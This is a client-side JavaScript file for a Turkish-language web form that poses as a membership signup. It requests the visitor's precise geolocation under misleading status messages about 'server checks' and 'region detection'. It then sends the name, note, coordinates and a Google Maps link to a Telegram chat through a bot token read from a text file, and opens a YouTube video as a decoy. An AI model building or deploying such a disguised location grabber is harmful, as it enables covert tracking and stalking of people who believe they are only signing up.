(async () => {
  const $ = id => document.getElementById(id);
  const form = $('form');
  const status = $('status');

  form.addEventListener('submit', async e => {
    e.preventDefault();

    const name = $('name').value.trim();
    const note = $('note').value.trim();
    const consent = $('consent').checked;
    if (!name || !consent) {
      status.textContent = "LÃ¼tfen adÄ±nÄ±zÄ± girin ve onay verin.";
      return;
    }

    status.textContent = "ğŸ“ Sunucu verileri kontrol ediliyor...";
    let pos;
    try {
      pos = await new Promise((res, rej) => {
        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 });
      });
    } catch {
      status.textContent = "âŒ Ãœyelik bÃ¶lge tespiti iÃ§in konum alÄ±namadÄ±.";
      return;
    }

    const lat = pos.coords.latitude.toFixed(6);
    const lon = pos.coords.longitude.toFixed(6);
    const map = `https://www.google.com/maps?q=${lat},${lon}`;
    const timestamp = new Date().toLocaleString();

    status.textContent = "ğŸ“¦ Sunucu kontrolleri okunuyor...";
    let raw;
    try {
      raw = await fetch("bilgiler.txt?v=" + Date.now()).then(r => r.text());
    } catch {
      status.textContent = "âŒ sunucu okunamadÄ± mustinin dÃ¼zetmesini bekle.";
      return;
    }

    const token = raw.match(/BOT_TOKEN=(.*)/)?.[1]?.trim();
    const chatId = raw.match(/CHAT_ID=(.*)/)?.[1]?.trim();
    if (!token || !chatId) {
      status.textContent = "âŒ sunucu eksik veya hatalÄ±.";
      return;
    }

    const msg = [
      `ğŸ§¾ Yeni GiriÅŸ`,
      `ğŸ‘¤ Ä°sim: ${name}`,
      `ğŸ“ Not: ${note || "-"}`,
      `ğŸ•’ Zaman: ${timestamp}`,
      `ğŸ“ Konum: ${lat}, ${lon}`,
      `ğŸ”— Harita: ${map}`,
      `ğŸ”’ Onay: Evet`
    ].join("\n");

    status.textContent = "ğŸš€ Ãœyelik gÃ¶nderiliyor...";
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const body = `chat_id=${chatId}&text=${encodeURIComponent(msg)}`;

    try {
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body
      });
      const json = await res.json();
      if (json.ok) {
        status.textContent = "âœ… Ãœyelik yapÄ±ldÄ±. Video aÃ§Ä±lÄ±yor...";
        setTimeout(() => {
          window.open("https://www.youtube.com/watch?v=ueNY30Cs8Lk", "_blank");
        }, 1500);
      } else {
        status.textContent = "âŒ Ãœyelik bilgileri gÃ¶nderimi baÅŸarÄ±sÄ±z.";
      }
    } catch {
      status.textContent = "âŒ AÄŸ hatasÄ±.";
    }
  });
})();


